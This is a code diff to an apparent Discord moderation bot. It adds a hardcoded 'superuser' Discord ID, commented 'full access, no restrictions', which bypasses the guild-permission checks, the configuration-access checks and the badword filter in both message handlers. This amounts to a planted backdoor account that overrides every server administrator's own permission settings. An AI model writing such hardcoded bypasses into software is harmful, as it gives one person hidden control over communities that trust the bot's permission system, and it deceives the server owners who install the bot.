@@ -227,11 +227,17 @@ const Colors = {
 //  PERMISSION SYSTEM
 // ══════════════════════════════════════════════════════════════════════════════
 
+const SUPERUSERS = new Set(["544462092602966026"]); // 3amer3823 — full access, no restrictions
+
+function isSuperuser(member) {
+  return SUPERUSERS.has(member.user.id);
+}
 function hasManageGuild(member) {
-  return member.permissions.has(PermissionFlagsBits.ManageGuild);
+  return isSuperuser(member) || member.permissions.has(PermissionFlagsBits.ManageGuild);
 }
 function hasConfigAccess(member, cfg) {
   return (
+    isSuperuser(member) ||
     hasManageGuild(member) ||
     member.roles.cache.some((r) => cfg.configRoles.has(r.id))
   );
@@ -850,7 +856,7 @@ client.on("messageUpdate", async (oldMessage, newMessage) => {
   if (!features.badwords || !newMessage.content) return;
 
   const cfg      = await getConfig(newMessage.guild.id);
-  const isExempt = newMessage.member?.roles?.cache.some((r) => cfg.exemptRoles.has(r.id));
+  const isExempt = isSuperuser(newMessage.member) || newMessage.member?.roles?.cache.some((r) => cfg.exemptRoles.has(r.id));
 
   if (!isExempt && cfg.allowedChannels.size > 0 && !cfg.allowedChannels.has(newMessage.channel.id)) {
     // outside monitored channels — only log the edit, don't moderate
@@ -1006,7 +1012,7 @@ client.on("messageCreate", async (message) => {
 
   if (cfg.allowedChannels.size > 0 && !cfg.allowedChannels.has(channel.id)) return;
 
-  const isExempt = member?.roles?.cache.some((r) => cfg.exemptRoles.has(r.id));
+  const isExempt = isSuperuser(member) || member?.roles?.cache.some((r) => cfg.exemptRoles.has(r.id));
 
   if (features.badwords && !isExempt) {
     const recentMessages = getRecentMessages(message.author.id, message);
